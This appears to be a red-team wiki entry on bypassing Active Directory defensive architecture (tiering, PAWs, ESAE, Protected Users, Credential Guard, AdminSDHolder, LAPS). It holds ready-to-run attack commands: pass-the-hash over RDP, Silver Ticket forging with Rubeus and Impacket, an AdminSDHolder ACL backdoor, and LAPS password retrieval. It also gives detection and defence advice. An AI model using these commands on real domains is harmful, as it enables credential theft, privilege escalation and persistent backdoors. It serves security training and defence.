---
title: Bypassing AD defensive architecture
slug: ad-defensive-architecture-bypass
aliases: [AD defensive bypass, tiered admin bypass, Red Forest bypass, ESAE bypass, PAW bypass, Credential Guard bypass]
---

> **TL;DR:** Modern AD environments deploy tiered admin models, PAWs, Credential Guard, Protected Users, and ESAE/Red Forest to contain lateral movement — but each control has known bypass paths. Red teamers must understand the architecture to find the gaps: RDP Restricted Admin mode, Silver Tickets against Credential Guard, AdminSDHolder abuse, LAPS retrieval, and cross-tier credential exposure.

## What it is
Enterprise AD environments hardened beyond default deploy layered defences: the Microsoft tiered admin model (Tier 0/1/2), Privileged Access Workstations (PAWs), the ESAE (Enhanced Security Admin Environment) / "Red Forest" architecture, Protected Users group, Credential Guard, and LAPS. Each addresses a specific attack path — and each has documented weaknesses when the implementation is imperfect or the attacker understands the architecture.

## Preconditions / where it applies
- Target has implemented some form of AD tiered administration
- Post-exploitation — you have a foothold and are looking to escalate across tiers
- CRTP/CRTE/OSEP scenario: domain compromise despite defensive architecture

## Technique

### 1 — Tiered admin model weaknesses
Microsoft's tier model isolates admin credentials by sensitivity:
- **Tier 0:** Domain Controllers, AD CS, ADFS, AD Connect, PKI
- **Tier 1:** Member servers, applications, databases
- **Tier 2:** Workstations, end-user devices

Attack paths when the model is imperfect:
```
# find tier-crossing: Tier 0 admin logged into a Tier 1/2 machine
# BloodHound query — admins with sessions on lower-tier machines
MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(c:Computer)
WHERE g.name CONTAINS 'DOMAIN ADMINS' AND c.operatingsystem CONTAINS 'Windows 10'
RETURN u.name, c.name

# or via SharpHound
SharpHound.exe -c Session,LoggedOn --domaincontroller dc01.corp.local
```

Common failures: Tier 0 admins using the same account for email, Tier 1 service accounts with Tier 0 privileges, shared jump servers across tiers, GPO delegation leaking across boundaries.

### 2 — Privileged Access Workstations (PAW) bypass
PAWs restrict where privileged credentials can be used. Bypass when:

- **PAW policy not enforced via Authentication Policy Silos** — admins can still RDP from non-PAW machines if only OU-based GPO is used
- **Kerberos delegation on PAW-adjacent services** — constrained delegation from a Tier 1 service to a Tier 0 resource bypasses the PAW requirement
- **NTLM relay from PAW subnet** — if PAWs allow NTLM, relay attacks work (see [[ntlm-relay]])
- **Compromised PAW management infrastructure** — SCCM, Intune, or the PAW build pipeline becomes the target

```powershell
# check if Authentication Policy Silos are enforced
Get-ADAuthenticationPolicySilo -Filter *
Get-ADUser -Filter {MemberOf -eq "CN=Protected Users,CN=Users,DC=corp,DC=local"} -Properties msDS-AssignedAuthNPolicySilo
```

### 3 — ESAE / Red Forest bypass
ESAE creates a separate "bastion" forest with one-way trust to the production forest. Tier 0 admin is done from the bastion forest.

Attack paths:
- **SID History injection** — if SID filtering is not enforced on the trust, inject Enterprise Admins SID from the production forest into a bastion account (see [[sid-history-abuse]])
- **Trust key extraction** — compromise the bastion forest DC, extract the inter-forest trust key, and forge cross-forest TGTs
- **AD Connect / sync account** — the sync account between bastion and production often has excessive privileges
- **Golden ticket in production forest** — ESAE protects Tier 0 credentials but if you get a Golden Ticket via another path (Kerberoast, AS-REP roast, DPAPI, DCSync on a secondary DC), the bastion is irrelevant

```powershell
# check trust attributes — SID filtering status
Get-ADTrust -Filter * | Select-Object Name,Direction,SIDFilteringForestAware,SIDFilteringQuarantined
```

### 4 — Protected Users group limitations
Protected Users prevents NTLM auth, delegation, DES/RC4 in Kerberos, and credential caching. Known gaps:

- **Only protects interactive logons** — service accounts in Protected Users break Kerberos delegation (so most orgs exclude them) leaving those accounts exposed
- **Does not prevent Kerberoasting** — if the account has an SPN, TGS tickets are still requestable and crackable offline
- **Does not prevent AS-REP Roasting** — if `DONT_REQ_PREAUTH` is set (shouldn't be, but misconfig happens)
- **Pass-the-Ticket still works** — if you steal a TGT from memory (the TGT is cached during the logon session), you can use it until it expires (4-hour default)
- **No protection against DCSync** — Protected Users restricts credential caching, not replication rights

```powershell
# enumerate Protected Users
Get-ADGroupMember "Protected Users" | Select-Object Name,objectClass
# check who is NOT in it but should be
Get-ADUser -Filter {AdminCount -eq 1} | Where-Object {
  (Get-ADUser $_.SamAccountName -Properties MemberOf).MemberOf -notcontains
  "CN=Protected Users,CN=Users,DC=corp,DC=local"
}
```

### 5 — Credential Guard bypass
Credential Guard uses VBS (Virtualization-Based Security) to isolate LSASS secrets. NTLM hashes and Kerberos TGTs are in the secure enclave — Mimikatz `sekurlsa::logonpasswords` returns nothing.

Bypasses:
- **RDP Restricted Admin mode** — if enabled, allows Pass-the-Hash to RDP without knowing the plaintext password. Credential Guard does not block this:
```bash
# pass-the-hash via RDP Restricted Admin
xfreerdp /v:target /u:admin /pth:<NTLM_HASH> /restricted-admin
# or with Mimikatz
sekurlsa::pth /user:admin /ntlm:<hash> /domain:corp /run:"mstsc /restrictedadmin"
```

- **Silver Ticket** — Credential Guard protects the TGT but not service ticket forgery. With a service account's NTLM hash (from Kerberoast, DCSync, or another host), forge a Silver Ticket directly — no TGT needed:
```bash
# Rubeus
Rubeus.exe silver /service:cifs/target.corp.local /rc4:<svc_hash> /user:admin /domain:corp.local /sid:<domain_SID> /ptt

# Impacket
ticketer.py -nthash <svc_hash> -domain-sid <SID> -domain corp.local -spn cifs/target.corp.local admin
```

- **DPAPI with domain backup key** — Credential Guard does not protect DPAPI. Extract the domain DPAPI backup key via DCSync and decrypt saved credentials on any machine
- **Kerberoasting is unaffected** — service account hashes are in AD, not in LSASS

### 6 — AdminSDHolder abuse
AdminSDHolder is a container whose ACL is stamped onto all protected objects (Domain Admins, Enterprise Admins, etc.) every 60 minutes by SDProp. If you can modify AdminSDHolder's ACL, your backdoor persists despite manual cleanup:

```powershell
# add a backdoor — give yourUser GenericAll on AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity yourUser -Rights All -Verbose

# SDProp runs every 60min — after that, yourUser has GenericAll on Domain Admins
# force SDProp to run immediately (requires privileged access)
Invoke-SDPropagator -Domain corp.local
```

Detection: monitor ACL changes on `CN=AdminSDHolder,CN=System`. See [[acl-abuse]].

### 7 — LAPS password retrieval
LAPS stores local admin passwords in AD attributes (`ms-Mcs-AdmPwd` for legacy LAPS, `msLAPS-Password` for Windows LAPS). If you can read these attributes:

```powershell
# legacy LAPS — read password (requires Read permission on the attribute)
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd'} |
  Select-Object Name,ms-Mcs-AdmPwd

# crackmapexec
crackmapexec ldap dc01.corp.local -u user -p pass --module laps

# Windows LAPS (2023+) — encrypted, but readable with the right permissions
Get-LapsADPassword -Identity target-pc -AsPlainText
```

Who can read LAPS: check `ms-Mcs-AdmPwd` ACL on computer objects — often Helpdesk groups, delegated admins, or overly broad read permissions. LAPS gives you local admin on every machine in scope — lateral movement gold.

```powershell
# find who can read LAPS passwords
Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=corp,DC=local"
# PowerView
Get-DomainObjectAcl -SearchBase "OU=Servers,DC=corp,DC=local" -ResolveGUIDs |
  Where-Object {$_.ObjectAceType -match "ms-Mcs-AdmPwd"}
```

## Detection and defence
- **Enforce Authentication Policy Silos**, not just OU-based GPO, for tier isolation
- **Enable SID filtering** on all forest trusts; audit trust attributes regularly
- **Audit AdminSDHolder ACL** and alert on changes — SDProp is a persistence goldmine
- **Put all privileged accounts in Protected Users** — accept the delegation trade-off by redesigning services
- **Disable RDP Restricted Admin** unless specifically needed (it's a PtH enabler)
- **LAPS ACLs**: restrict `ms-Mcs-AdmPwd` read to the minimum set; use Windows LAPS with encryption
- **Monitor for Kerberoasting** — event 4769 with RC4 encryption and service accounts
- **Credential Guard**: deploy on all Tier 0/1 systems, but don't rely on it alone — layer with Protected Users and network segmentation

See also [[kerberoasting]], [[ntlm-relay]], [[dcsync]], [[acl-abuse]], [[sid-history-abuse]], [[golden-ticket]], [[silver-ticket]].

## References
- [Microsoft — Privileged Access Strategy](https://learn.microsoft.com/en-us/security/privileged-access-workstations/overview) — tiered model + PAW design
- [Microsoft — Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) — capabilities and limitations
- [SpecterOps — AdminSDHolder persistence](https://posts.specterops.io/domain-persistence-adminsdholder-c6ad3506a31c) — abuse technique
- [HackTricks — LAPS](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html) — enumeration and retrieval
- [Credential Guard bypass techniques](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/) — RDP Restricted Admin + Silver Ticket
